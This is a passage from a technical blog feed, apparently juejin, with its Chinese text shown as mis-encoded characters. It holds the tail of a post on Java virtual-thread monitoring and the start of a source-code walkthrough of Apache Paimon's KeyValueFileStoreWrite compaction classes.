    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockBasedMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (lock.tryLock()) {  <span class="hljs-comment">// éé˜»å¡å°è¯•</span>
            <span class="hljs-keyword">try</span> {
                performIOOperation();
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æ‰§è¡Œæ›¿ä»£é€»è¾‘æˆ–é‡è¯•</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performIOOperation</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ¨¡æ‹ŸI/Oæ“ä½œ</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
</code></pre>
<h2 data-id="heading-16">å…­ã€ç›‘æ§ä¸è¯Šæ–­å·¥å…·</h2>
<h3 data-id="heading-17">6.1 JFRï¼ˆJava Flight Recorderï¼‰äº‹ä»¶</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯ç”¨è™šæ‹Ÿçº¿ç¨‹ç›¸å…³çš„JFRäº‹ä»¶</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadMonitoring</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// JFRå¯ä»¥è®°å½•è™šæ‹Ÿçº¿ç¨‹ç‰¹å®šäº‹ä»¶ï¼š</span>
        <span class="hljs-comment">// - jdk.VirtualThreadStart</span>
        <span class="hljs-comment">// - jdk.VirtualThreadEnd</span>
        <span class="hljs-comment">// - jdk.VirtualThreadPinned</span>
        <span class="hljs-comment">// - jdk.VirtualThreadSubmitFailed</span>
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">vThread</span> <span class="hljs-operator">=</span> Thread.startVirtualThread(() -&gt; {
            System.out.println(<span class="hljs-string">"è™šæ‹Ÿçº¿ç¨‹æ‰§è¡Œä¸­..."</span>);
            
            <span class="hljs-comment">// å½“è™šæ‹Ÿçº¿ç¨‹è¢«å›ºå®šåœ¨è½½ä½“çº¿ç¨‹æ—¶è§¦å‘äº‹ä»¶</span>
            <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {  <span class="hljs-comment">// å¯èƒ½å¯¼è‡´pinnedäº‹ä»¶</span>
                System.out.println(<span class="hljs-string">"åœ¨åŒæ­¥å—ä¸­æ‰§è¡Œ"</span>);
            }
        });
        
        vThread.join();
        
        <span class="hljs-comment">// ä½¿ç”¨jcmdæˆ–JMCæŸ¥çœ‹JFRè®°å½•</span>
        <span class="hljs-comment">// jcmd &lt;pid&gt; JFR.start duration=60s filename=recording.jfr</span>
    }
}
</code></pre>
<h3 data-id="heading-18">6.2 çº¿ç¨‹è½¬å‚¨åˆ†æ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹çš„çº¿ç¨‹è½¬å‚¨æ ¼å¼ç¤ºä¾‹</span>
<span class="hljs-string">"VirtualThread[#12345]/runnable@ForkJoinPool-1-worker-3"</span>
   java.base/java.lang.VirtualThread.run(VirtualThread.java:<span class="hljs-number">329</span>)
   com.example.MyClass.myMethod(MyClass.java:<span class="hljs-number">45</span>)
   
<span class="hljs-comment">// å…³é”®ä¿¡æ¯ï¼š</span>
<span class="hljs-comment">// - çº¿ç¨‹åç§°æ ¼å¼ï¼šVirtualThread[#id]/çŠ¶æ€@è½½ä½“çº¿ç¨‹</span>
<span class="hljs-comment">// - æ ˆè·Ÿè¸ªæ˜¾ç¤ºå®é™…æ‰§è¡Œç‚¹</span>
<span class="hljs-comment">// - å¯ä»¥è¯†åˆ«è¢«å›ºå®šçš„è™šæ‹Ÿçº¿ç¨‹ï¼ˆpinned virtual threadsï¼‰</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Paimonæºç è§£è¯» -- Compaction-4.KeyValueFileStoreWrite]]></title>    <link>https://juejin.cn/post/7582872365522501670</link>    <guid>https://juejin.cn/post/7582872365522501670</guid>    <pubDate>2025-12-13T09:58:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582872365522501670" data-draft-id="7582872365522141222" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Paimonæºç è§£è¯» -- Compaction-4.KeyValueFileStoreWrite"/> <meta itemprop="keywords" content="å¤§æ•°æ®,Flink"/> <meta itemprop="datePublished" content="2025-12-13T09:58:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="expect7g"/> <meta itemprop="url" content="https://juejin.cn/user/3514471387235735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Paimonæºç è§£è¯» -- Compaction-4.KeyValueFileStoreWrite
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3514471387235735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    expect7g
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T09:58:51.000Z" title="Sat Dec 13 2025 09:58:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ¬æ–‡é‡ç‚¹ä»‹ç»å‹ç¼©ä¸­çš„<code>KeyValueFileStoreWrite</code>ç±»ï¼Œè¯¥ç±»å’Œcompactå¾ˆå¤šæµç¨‹éƒ½ç›¸å…³</p>
<h2 data-id="heading-1">ä¸€.KeyValueFileStoreWriteç±»</h2>
<p>è¯¥ç±»çš„ç»§æ‰¿è·¯çº¿å¦‚ä¸‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/122032eff8344237b75e871e1dde522a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZXhwZWN0N2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766224731&amp;x-signature=NFZTIY8j8tT%2BRnEcilVpFpTZ1CY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">1.ä»£ç è§£æ</h3>
<h4 data-id="heading-3">(0) æ ¸å¿ƒå‚æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Factoryè¯»å†™å™¨å·¥å‚ï¼Œæ ¹æ®å…·ä½“çš„ partition å’Œ bucket åŠ¨æ€åˆ›å»º</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KeyValueFileReaderFactory.Builder readerFactoryBuilder;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KeyValueFileWriterFactory.Builder writerFactoryBuilder;
<span class="hljs-comment">// ä¸‰ä¸ªå…³é”®æ¯”è¾ƒå™¨Supplier</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Supplier&lt;Comparator&lt;InternalRow&gt;&gt; keyComparatorSupplier; <span class="hljs-comment">// ä¸»é”®æ¯”è¾ƒå™¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Supplier&lt;FieldsComparator&gt; udsComparatorSupplier; <span class="hljs-comment">// è‡ªå®šä¹‰åºåˆ—å­—æ®µæ¯”è¾ƒå™¨ï¼Œå¦‚sequnce-groupå’Œsequnce-fieldæ ‡è®°å­—æ®µ</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Supplier&lt;RecordEqualiser&gt; logDedupEqualSupplier; <span class="hljs-comment">// æ—¥å¿—ç›¸ç­‰æ¯”è¾ƒå™¨</span>
<span class="hljs-comment">// åˆå¹¶å‡½æ•°å·¥å‚ - æ ¹æ®é…ç½®çš„merge-engineï¼Œå»åˆ›å»ºä¸åŒçš„MergeFunctionå®ç°ç±»</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MergeFunctionFactory&lt;KeyValue&gt; mfFactory;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> CoreOptions options; <span class="hljs-comment">// CoreOptionsé…ç½®</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> FileIO fileIO; <span class="hljs-comment">// æ–‡ä»¶IO</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RowType keyType; <span class="hljs-comment">// Keyçš„RowTypeä¿¡æ¯</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RowType valueType; <span class="hljs-comment">// Valueçš„RowTypeä¿¡æ¯</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RowType partitionType; <span class="hljs-comment">// åˆ†åŒºä¿¡æ¯</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String commitUser;
<span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RecordLevelExpire recordLevelExpire; <span class="hljs-comment">// è®°å½•Levelçš„è¿‡æœŸæœºåˆ¶</span>
<span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">private</span> Cache&lt;String, LookupFile&gt; lookupFileCache; <span class="hljs-comment">// lookupç¼“å­˜</span>
</code></pre>
<h4 data-id="heading-4">(1) <code>bufferSpillable()</code> -- æ˜¯å¦å…è®¸write-bufferæº¢å‡ºç£ç›˜</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@VisibleForTesting</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">bufferSpillable</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ç”±å‚æ•°'write-buffer-spillable'ç»‘å®šï¼Œæ²¡æœ‰åˆ™èµ‹å€¼ä¸º (fileIO.isObjectStore() || !isStreamingMode)</span>
    <span class="hljs-keyword">return</span> options.writeBufferSpillable(fileIO.isObjectStore(), isStreamingMode);
}
</code></pre>
<h4 data-id="heading-5">(2) <code>createWriter()</code> -- æ ¸å¿ƒ</h4>
<p>åˆ›å»ºå†™å…¥å™¨çš„æ ¸å¿ƒæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆ›å»º<code>KeyValueFileWriterFactoryå¯¹è±¡</code> -- WriterFactory</li>
<li>æ ¹æ®ä¸»é”®æ¯”è¾ƒå™¨ã€å­˜å‚¨æ–‡ä»¶ã€num-levelså‚æ•°ï¼Œå»åˆå§‹åŒ– LSM Tree å±‚çº§ç»“æ„ï¼Œå¾—åˆ°<code>Levelså¯¹è±¡</code> -- levels</li>
<li>åˆ›å»ºé€šç”¨å‹ç¼©ç­–ç•¥<code>UniversalCompaction</code>ï¼Œåç»­ç”±è¯¥ç±»çš„pick()å»æŒ‡å®šå“ªäº›æ–‡ä»¶è¯¥è¢«å‹ç¼© (æ ¸å¿ƒ)</li>
</ol>
<blockquote>
<p>æ³¨æ„ï¼šé€šç”¨å‹ç¼©ç­–ç•¥ä¸ä¸‹æ¸¸å››ä¸ªå‚æ•°æœ‰å…³ï¼Œè¯¦æƒ…è¯·çœ‹<a href="https://juejin.cn/editor/drafts/7582846276506632230" target="_blank" title="https://juejin.cn/editor/drafts/7582846276506632230">Paimonæºç è§£è¯» -- Compaction-CompactStrategy</a></p>
<ul>
<li>å‚æ•°'compaction.max-size-amplification-percent'ç»‘å®šï¼Œé»˜è®¤200</li>
<li>å‚æ•°'compaction.size-ratio'ç»‘å®šï¼Œé»˜è®¤1</li>
<li>å‚æ•°'num-sorted-run.compaction-trigger'ç»‘å®šï¼Œé»˜è®¤5</li>
<li>å‚æ•°'compaction.optimization-interval'ç»‘å®šï¼Œæ²¡æœ‰é»˜è®¤å€¼</li>
</ul>
</blockquote>
<ol start="4">
<li>é€‰æ‹©å‹ç¼©ç­–ç•¥</li>
</ol>
<blockquote>
<p>å¦‚æœneedLookup()=trueï¼Œåˆ™ä½¿ç”¨ForceUpLevel0Compactionå¼ºåˆ¶L0å‹ç¼©ç­–ç•¥ï¼›å¦åˆ™ï¼Œä½¿ç”¨UniversalCompaction</p>
<p>è§„åˆ™å¦‚ä¸‹: ä¸‹é¢ä»»æ„ä¸€ä¸ªä¸ºtrueï¼Œåˆ™needLookup()è¿”å›true</p>
<ol>
<li>merge-engine = first-row</li>
<li>changelog-producer = lookup</li>
<li>deletion-vectors.enabled = true</li>
<li>force-lookup = true</li>
</ol>
</blockquote>
<ol start="5">
<li>è°ƒ<code>createCompactManager()</code>å»åˆ›å»ºå¯¹åº”çš„<code>CompactManagerå®ç°ç±»</code></li>
<li>æ ¹æ®ä¸Šé¢åˆ›å»ºçš„æ‰€æœ‰å‚æ•°ï¼Œåˆ›å»º<code>MergeTreeWriter</code></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå†™å…¥å™¨Writer</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> MergeTreeWriter <span class="hljs-title function_">createWriter</span><span class="hljs-params">(
        <span class="hljs-meta">@Nullable</span> Long snapshotId,
        BinaryRow partition,
        <span class="hljs-type">int</span> bucket,
        List&lt;DataFileMeta&gt; restoreFiles,
        <span class="hljs-type">long</span> restoredMaxSeqNumber,
        <span class="hljs-meta">@Nullable</span> CommitIncrement restoreIncrement,
        ExecutorService compactExecutor,
        <span class="hljs-meta">@Nullable</span> DeletionVectorsMaintainer dvMaintainer)</span> {
    <span class="hljs-keyword">if</span> (LOG.isDebugEnabled()) {
        LOG.debug(
                <span class="hljs-string">"Creating merge tree writer for partition {} bucket {} from restored files {}"</span>,
                partition,
                bucket,
                restoreFiles);
    }
    <span class="hljs-comment">// æ­¥éª¤ 1: åˆ›å»º KeyValueFileWriterFactoryå¯¹è±¡ -- WriterFactory</span>
    <span class="hljs-type">KeyValueFileWriterFactory</span> <span class="hljs-variable">writerFactory</span> <span class="hljs-operator">=</span>
            writerFactoryBuilder.build(partition, bucket, options);
    <span class="hljs-comment">// æ­¥éª¤ 2: æ ¹æ®ä¸»é”®æ¯”è¾ƒå™¨ã€å­˜å‚¨æ–‡ä»¶ã€num-levelså‚æ•°ï¼Œå»åˆå§‹åŒ– LSM Tree å±‚çº§ç»“æ„ï¼Œå¾—åˆ°Levelså¯¹è±¡ -- levels</span>
    Comparator&lt;InternalRow&gt; keyComparator = keyComparatorSupplier.get();
    <span class="hljs-type">Levels</span> <span class="hljs-variable">levels</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Levels</span>(keyComparator, restoreFiles, options.numLevels());
    <span class="hljs-comment">// æ­¥éª¤ 3: åˆ›å»ºé€šç”¨å‹ç¼©ç­–ç•¥UniversalCompactionï¼Œåç»­ç”±è¯¥ç±»çš„pick()å»æŒ‡å®šå“ªäº›æ–‡ä»¶è¯¥è¢«å‹ç¼© (æ ¸å¿ƒ)</span>
    <span class="hljs-type">UniversalCompaction</span> <span class="hljs-variable">universalCompaction</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UniversalCompaction</span>(
                    options.maxSizeAmplificationPercent(),      <span class="hljs-comment">// ç”±å‚æ•°'compaction.max-size-amplification-percent'ç»‘å®šï¼Œé»˜è®¤200</span>
                    options.sortedRunSizeRatio(),               <span class="hljs-comment">// ç”±å‚æ•°'compaction.size-ratio'ç»‘å®šï¼Œé»˜è®¤1</span>
                    options.numSortedRunCompactionTrigger(),    <span class="hljs-comment">// ç”±å‚æ•°'num-sorted-run.compaction-trigger'ç»‘å®šï¼Œé»˜è®¤5</span>
                    options.optimizedCompactionInterval());     <span class="hljs-comment">// ç”±å‚æ•°'compaction.optimization-interval'ç»‘å®šï¼Œæ²¡æœ‰é»˜è®¤å€¼</span>

    <span class="hljs-comment">/* æ­¥éª¤ 4: å¦‚æœneedLookup()ï¼Œåˆ™ä½¿ç”¨ForceUpLevel0Compactionå¼ºåˆ¶L0å‹ç¼©ç­–ç•¥ï¼›å¦åˆ™ï¼Œä½¿ç”¨UniversalCompaction
        è§„åˆ™å¦‚ä¸‹: ä¸‹é¢ä»»æ„ä¸€ä¸ªä¸ºtrueï¼Œåˆ™needLookup()è¿”å›true
        1. merge-engine = first-row
        2. changelog-producer = lookup
        3. deletion-vectors.enabled = true
        4. force-lookup = true
    */</span>
    <span class="hljs-type">CompactStrategy</span> <span class="hljs-variable">compactStrategy</span> <span class="hljs-operator">=</span>
            options.needLookup()
                    ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForceUpLevel0Compaction</span>(universalCompaction)
                    : universalCompaction;
    <span class="hljs-comment">// æ­¥éª¤ 5: è°ƒcreateCompactManager()å»åˆ›å»ºå¯¹åº”çš„CompactManagerå®ç°ç±»</span>
    <span class="hljs-type">CompactManager</span> <span class="hljs-variable">compactManager</span> <span class="hljs-operator">=</span>
            createCompactManager(
                    partition, bucket, compactStrategy, compactExecutor, levels, dvMaintainer);
    <span class="hljs-comment">// æ­¥éª¤ 6: æ ¹æ®ä¸Šé¢åˆ›å»ºçš„æ‰€æœ‰å‚æ•°ï¼Œåˆ›å»ºMergeTreeWriter()</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MergeTreeWriter</span>(
            bufferSpillable(),
            options.writeBufferSpillDiskSize(),
            options.localSortMaxNumFileHandles(),
            options.spillCompressOptions(),
            ioManager,
            compactManager,
            restoredMaxSeqNumber,
            keyComparator,
            mfFactory.create(),
            writerFactory,
            options.commitForceCompact(),
            options.changelogProducer(),
            restoreIncrement,
            UserDefinedSeqComparator.create(valueType, options));
}
</code></pre>
<h4 data-id="heading-6">(3) <code>createCompactManager()</code> -- åˆ›å»ºå‹ç¼©ç®¡ç†å™¨CompactManager</h4>
<p>CASE-1: write-only = trueï¼Œç”¨<code>NoopCompactManager</code>ï¼Œä¸æ‰§è¡Œä»»ä½•å‹ç¼©æ“ä½œ<br/>
CASE-2: write-only = falseï¼Œç”¨<code>MergeTreeCompactManager</code>å»ç®¡ç†å‹ç¼©ä»»åŠ¡
å…³äºè¿™ä¿©CompactManagerå®ç°ç±»è¯¦æƒ…è¯·çœ‹<a href="https://juejin.cn/post/7582872365522190374" target="_blank" title="https://juejin.cn/post/7582872365522190374">Paimonæºç è§£è¯» -- Compaction-5.CompactManager</a></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> CompactManager <span class="hljs-title function_">createCompactManager</span><span class="hljs-params">(
        BinaryRow partition,
        <span class="hljs-type">int</span> bucket,
        CompactStrategy compactStrategy,
        ExecutorService compactExecutor,
        Levels levels,
        <span class="hljs-meta">@Nullable</span> DeletionVectorsMaintainer dvMaintainer)</span> {
    <span class="hljs-comment">// CASE-1: write-only = trueï¼Œç”¨NoopCompactManagerï¼Œä¸æ‰§è¡Œä»»ä½•å‹ç¼©æ“ä½œ</span>
    <span class="hljs-keyword">if</span> (options.writeOnly()) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoopCompactManager</span>();
    }
    <span class="hljs-comment">// CASE-2: write-only = falseï¼Œç”¨MergeTreeCompactManagerå»ç®¡ç†å‹ç¼©ä»»åŠ¡</span>
    <span class="hljs-keyword">else</span> {
        Comparator&lt;InternalRow&gt; keyComparator = keyComparatorSupplier.get();
        <span class="hljs-meta">@Nullable</span> <span class="hljs-type">FieldsComparator</span> <span class="hljs-variable">userDefinedSeqComparator</span> <span class="hljs-operator">=</span> udsComparatorSupplier.get();
        <span class="hljs-comment">// åˆ›å»ºCompactRewriterï¼ˆæ ¸å¿ƒé‡å†™å™¨ï¼‰</span>
        <span class="hljs-type">CompactRewriter</span> <span class="hljs-variable">rewriter</span> <span class="hljs-operator">=</span>
                createRewriter(
                        partition,
                        bucket,
                        keyComparator,
                        userDefinedSeqComparator,
                        levels,
                        dvMaintainer);
        <span class="hljs-comment">// åˆ›å»ºå¹¶è¿”å› MergeTreeCompactManager</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MergeTreeCompactManager</span>(
                compactExecutor,
                levels,
                compactStrategy,
                keyComparator,
                options.compactionFileSize(<span class="hljs-literal">true</span>), <span class="hljs-comment">// target-file-sizeçš„70%è¿™ä¸ªæ˜¯å‹ç¼©çš„ç›®æ ‡æ–‡ä»¶å¤§å°ï¼Œä»¥å®ƒä¸ºç•Œé™åŒºåˆ†å¤§æ–‡ä»¶å’Œå°æ–‡ä»¶</span>
                options.numSortedRunStopTrigger(),
                rewriter,
                compactionMetrics == <span class="hljs-literal">null</span>
                        ? <span class="hljs-literal">null</span>
                        : compactionMetrics.createReporter(partition, bucket),
                dvMaintainer,
                options.prepareCommitWaitCompaction());
    }
}
</code></pre>
<h4 data-id="heading-7">(4) <code>createRewriter()</code> -- åˆå¹¶é‡å†™æ–‡ä»¶çš„æ ¸å¿ƒå…¥å£</h4>
<p>æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆ›å»ºè¯»å†™å·¥å‚</li>
<li>åˆ›å»ºæ ¸å¿ƒåˆå¹¶æ’åºç®—æ³•ç±»<code>MergeSorter(è¿™æ˜¯æ ¸å¿ƒ)</code>ï¼Œä»¥åŠå…¶ä»–åˆå¹¶ç›¸å…³å‚æ•°</li>
<li>åˆ†æƒ…å†µå»åˆ›å»ºMergeTreeCompactRewriterå¯¹è±¡
<ul>
<li><strong>CASE-1: changelog-producer = full-compaction</strong>ï¼Œåˆ›å»ºå¹¶è¿”å›<code>FullChangelogMergeTreeCompactRewriter</code></li>
<li><strong>CASE-2: needLookupä¸ºtrue(è§„åˆ™åœ¨ä¸Šé¢createWriter()å·²ç»ä»‹ç»äº†)</strong>ï¼Œè¿›ä¸€æ­¥åŒºåˆ†å†…éƒ¨å·¥å‚ï¼Œç„¶ååˆ›å»ºå¹¶è¿”å›<code>LookupMergeTreeCompactRewriter</code></li>
<li><strong>CASE-3: é»˜è®¤æƒ…å†µ</strong>ï¼Œé‡‡ç”¨<code>MergeTreeCompactRewriter</code></li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ ¸å¿ƒä»£ç ï¼šåˆå¹¶é‡å†™æ–‡ä»¶çš„æ ¸å¿ƒå…¥å£æ–¹æ³•</span>
<span class="hljs-keyword">private</span> MergeTreeCompactRewriter <span class="hljs-title function_">createRewriter</span><span class="hljs-params">(
        BinaryRow partition,
        <span class="hljs-type">int</span> bucket,
        Comparator&lt;InternalRow&gt; keyComparator,
        <span class="hljs-meta">@Nullable</span> FieldsComparator userDefinedSeqComparator,
        Levels levels,
        <span class="hljs-meta">@Nullable</span> DeletionVectorsMaintainer dvMaintainer)</span> {
    DeletionVector.<span class="hljs-type">Factory</span> <span class="hljs-variable">dvFactory</span> <span class="hljs-operator">=</span> DeletionVector.factory(dvMaintainer);
    FileReaderFactory&lt;KeyValue&gt; readerFactory =
            readerFactoryBuilder.build(partition, bucket, dvFactory);
    <span class="hljs-keyword">if</span> (recordLevelExpire != <span class="hljs-literal">null</span>) {
        readerFactory = recordLevelExpire.wrap(readerFactory);
    }
    <span class="hljs-comment">// æ­¥1. åˆ›å»ºè¯»å†™å·¥å‚</span>
    <span class="hljs-type">KeyValueFileWriterFactory</span> <span class="hljs-variable">writerFactory</span> <span class="hljs-operator">=</span>
            writerFactoryBuilder.build(partition, bucket, options);
